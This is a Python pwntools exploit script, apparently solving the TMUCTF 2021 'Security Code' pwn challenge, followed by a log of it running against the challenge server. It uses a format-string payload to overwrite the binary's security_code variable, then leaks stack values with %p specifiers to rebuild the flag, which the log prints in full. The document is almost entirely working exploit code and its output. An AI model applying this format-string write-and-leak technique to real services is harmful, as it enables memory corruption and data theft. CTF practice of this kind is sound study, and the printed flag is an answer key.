from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './securitycode'
elf  = ELF(BINARY)

flag = ""
index = 15

for i in range(30):
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "185.235.41.205"
    PORT = 7040
    s = remote(HOST, PORT)
  else:
    s = process(BINARY)

  s.recvuntil("Enter 'A' for admin and 'U' for user.\n")
  s.sendline("A")

  s.recvuntil("Enter you name:")

  writes = {elf.sym.security_code: 0xabadcafe}
  buf = fmtstr_payload(index, writes, write_size='byte')
  s.sendline(buf)

  s.recvuntil("Enter your password: \n")
  s.sendline("%%%d$p" % (i+7))

  s.recvuntil("The password is ")
  flag += p32(int(s.recvuntil("\n"), 16))
  print flag
  s.close()

s.interactive()

'''
mito@ubuntu:~/CTF/TMUCTF_2021/Pwn_Security_Code$ python solve.py r
[*] '/home/mito/CTF/TMUCTF_2021/Pwn_Security_Code/securitycode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUC
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{5
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_5
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6_4b0
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm4
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm47_57
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm47_57r1n6
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm47_57r1n6_0xf
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm47_57r1n6_0xf7e11
[*] Closed connection to 185.235.41.205 port 7040
[+] Opening connection to 185.235.41.205 on port 7040: Done
TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm47_57r1n6_0xf7e11340}
'''
